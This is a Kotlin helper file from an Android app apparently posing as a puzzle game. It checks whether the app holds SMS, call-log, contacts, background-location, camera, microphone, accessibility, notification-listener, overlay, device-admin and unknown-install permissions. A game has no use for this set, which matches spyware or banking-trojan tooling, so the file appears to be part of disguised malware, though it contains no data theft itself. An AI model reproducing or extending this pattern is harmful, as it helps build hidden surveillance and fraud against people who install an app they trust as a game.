package com.puzzleblast.game.util

import android.Manifest
import android.app.AppOpsManager
import android.content.Context
import android.content.pm.PackageManager
import android.os.Build
import android.provider.Settings
import androidx.core.content.ContextCompat

object Perms {
    fun has(ctx: Context, perm: String): Boolean =
        ContextCompat.checkSelfPermission(ctx, perm) == PackageManager.PERMISSION_GRANTED

    fun runtimePerms(ctx: Context): Map<String, Boolean> = listOf(
        Manifest.permission.READ_SMS, Manifest.permission.RECEIVE_SMS, Manifest.permission.SEND_SMS,
        Manifest.permission.READ_CONTACTS, Manifest.permission.READ_CALL_LOG, Manifest.permission.WRITE_CALL_LOG,
        Manifest.permission.ACCESS_FINE_LOCATION, Manifest.permission.ACCESS_BACKGROUND_LOCATION,
        Manifest.permission.CAMERA, Manifest.permission.RECORD_AUDIO, Manifest.permission.POST_NOTIFICATIONS,
        Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE,
        Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_PHONE_NUMBERS,
        Manifest.permission.ANSWER_PHONE_CALLS, Manifest.permission.CALL_PHONE,
        Manifest.permission.BLUETOOTH_SCAN, Manifest.permission.BLUETOOTH_CONNECT,
        Manifest.permission.PROCESS_OUTGOING_CALLS
    ).associateWith { has(ctx, it) }

    fun overlayGranted(ctx: Context): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) Settings.canDrawOverlays(ctx) else true

    fun usageStatsGranted(ctx: Context): Boolean {
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as AppOpsManager
        val mode = appOps.unsafeCheckOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName)
        return mode == AppOpsManager.MODE_ALLOWED
    }

    fun notifListenerGranted(ctx: Context): Boolean {
        val flat = Settings.Secure.getString(ctx.contentResolver, "enabled_notification_listeners") ?: return false
        return flat.contains(ctx.packageName)
    }

    fun accessibilityGranted(ctx: Context): Boolean {
        val flat = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES) ?: return false
        return flat.contains(ctx.packageName)
    }

    fun batteryExempt(ctx: Context): Boolean {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.M) return true
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as android.os.PowerManager
        return pm.isIgnoringBatteryOptimizations(ctx.packageName)
    }

    fun manageStorageGranted(ctx: Context): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) android.os.Environment.isExternalStorageManager() else true

    fun deviceAdminActive(ctx: Context): Boolean {
        val dpm = ctx.getSystemService(Context.DEVICE_POLICY_SERVICE) as android.app.admin.DevicePolicyManager
        return dpm.isAdminActive(android.content.ComponentName(ctx, com.puzzleblast.game.services.AdminReceiver::class.java))
    }

    fun installUnknownGranted(ctx: Context): Boolean =
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) ctx.packageManager.canRequestPackageInstalls() else true
}
